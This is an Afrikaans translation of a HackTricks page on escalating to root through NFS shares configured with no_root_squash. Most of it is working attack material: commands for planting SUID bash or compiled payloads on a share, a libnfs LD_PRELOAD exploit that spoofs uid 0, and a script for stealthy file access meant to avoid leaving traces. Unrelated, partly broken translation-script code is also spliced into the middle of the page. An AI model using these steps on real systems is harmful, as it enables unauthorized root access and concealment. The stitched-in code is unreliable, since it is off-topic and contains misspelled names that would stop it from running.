<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>


Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat gekonfigureer is as **no\_root\_squash**, kan jy dit **toegang** vanaf **as 'n kliënt** en **binne skryf** daardie gids **asof** jy die plaaslike **root** van die masjien was.

**no\_root\_squash**: Hierdie opsie gee basies mag aan die root-gebruiker op die kliënt om lêers op die NFS-bediener as root te benader. En dit kan ernstige veiligheidsimplikasies hê.

**no\_all\_squash:** Dit is soortgelyk aan die **no\_root\_squash**-opsie, maar dit geld vir **nie-root-gebruikers**. Stel jou voor, jy het 'n skulp as 'n niemand-gebruiker; gekontroleer die /etc/exports-lêer; no\_all\_squash-opsie is teenwoordig; kyk na die /etc/passwd-lêer; boots 'n nie-root-gebruiker na; skep 'n suid-lêer as daardie gebruiker (deur te monteer met nfs). Voer die suid uit as die niemand-gebruiker en word 'n ander gebruiker.

# Privilege Escalation

## Remote Exploit

As jy hierdie kwesbaarheid gevind het, kan jy dit uitbuit:

* **Monteer daardie gids** op 'n kliëntmasjien en **as root kopieer** binne die gemonteerde gids die **/bin/bash** binêre lêer en gee dit **SUID**-regte, en **voer vanaf die slagoffer**-masjien daardie bash-binêre lêer uit.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Monteer daardie gids** op 'n kliëntmasjien en **kopieer as root** binne die gemonteerde gids ons saamgestelde payload wat die SUID-regte sal misbruik, gee dit **SUID-regte**, en **voer dit uit vanaf die slagoffer** se masjien daardie binêre lêer (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Plaaslike Uitbuiting

{% hint style="info" %}
Let daarop dat as jy 'n **tunnel vanaf jou masjien na die slagoffer se masjien kan skep, kan jy steeds die afstandsweergawe gebruik om hierdie voorregverhoging te misbruik deur die vereiste poorte te tunnel**.\
Die volgende truuk is in die geval dat die lêer `/etc/exports` **'n IP aandui**. In hierdie geval sal jy in enige geval nie die **afstandsweergawe kan gebruik nie** en sal jy hierdie truuk moet **misbruik**.\
'n Ander vereiste vir die uitbuiting om te werk, is dat **die uitvoer binne `/etc/export` die `insecure` vlag moet gebruik**.\
\--_Ek is nie seker of hierdie truuk sal werk as `/etc/export` 'n IP-adres aandui nie_--
{% endhint %}

## Basiese Inligting

Die scenario behels die uitbuiting van 'n gemoniteerde NFS-deel op 'n plaaslike masjien, deur gebruik te maak van 'n fout in die NFSv3-spesifikasie wat die kliënt in staat stel om sy uid/gid te spesifiseer, wat moontlik ongemagtigde toegang moontlik maak. Die uitbuiting behels die gebruik van [libnfs](https://github.com/sahlberg/libnfs), 'n biblioteek wat die vervalsing van NFS RPC-oproepe moontlik maak.

### Kompilering van die Biblioteek

Die kompileringstappe van die biblioteek mag aanpassings vereis op grond van die kernweergawe. In hierdie spesifieke geval is die fallocate-sisteemaanroep uitgekommentaar. Die kompileringproses behels die volgende opdragte:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Uitvoering van die Exploit

Die exploit behels die skep van 'n eenvoudige C-program (`pwn.c`) wat voorregte na root verhoog en dan 'n skul uitvoer. Die program word gekompileer en die resulterende binêre (`a.out`) word op die deel geplaas met suid root, deur gebruik te maak van `ld_nfs.so` om die uid in die RPC-oproepe te vervals:

1. **Kompileer die exploit-kode:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Plaas die exploit op die deel en wysig sy regte deur die uid te vervals:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Voer die exploit uit om root-voorregte te verkry:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell vir Steelse Toegang tot Lêers
Sodra root-toegang verkry is, word 'n Python-skripsie (nfsh.py) gebruik om met die NFS-deel te kommunikeer sonder om eienaarskap te verander (om spore te vermy). Hierdie skripsie pas die uid aan om ooreen te stem met die lêer wat toegang word, wat interaksie met lêers op die deel moontlik maak sonder toestemmingsprobleme:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
```python
import requests

def translate_text(text):
    url = "https://api.mymemory.translated.net/get"
    params = {
        "q": text,
        "langpair": "en|af"
    }
    response = requests.get(url, params=params)
    translation = response.json()["responseData"]["translatedText"]
    return translation

def translate_file(file_path):
    with open(file_path, "r") as file:
        content = file.read()
    translated_content = translate_text(content)
    with open(file_path, "w") as file:
        file.write(translated_content)

translate_file("/hive/hacktricks/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.md")
```

Afrikaans translation:

```python
import requests

def vertaal_teks(teks):
    url = "https://api.mymemory.translated.net/get"
    params = {
        "q": teks,
        "langpair": "en|af"
    }
    response = requests.get(url, params=params)
    vertaling = response.json()["responseData"]["translatedText"]
    return vertaling

def vertaal_lêer(lêer_pad):
    with open(lêer_pad, "r") as lêer:
        inhoud = lêer.read()
    vertaalde_inhoud = vertaal_teks(inhoud)
    with open(lêer_pad, "w") as lêer:
        lêer.write(vervaalde_inhoud)

vervaal_lêer("/hive/hacktricks/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.md")
```
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Verwysings
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
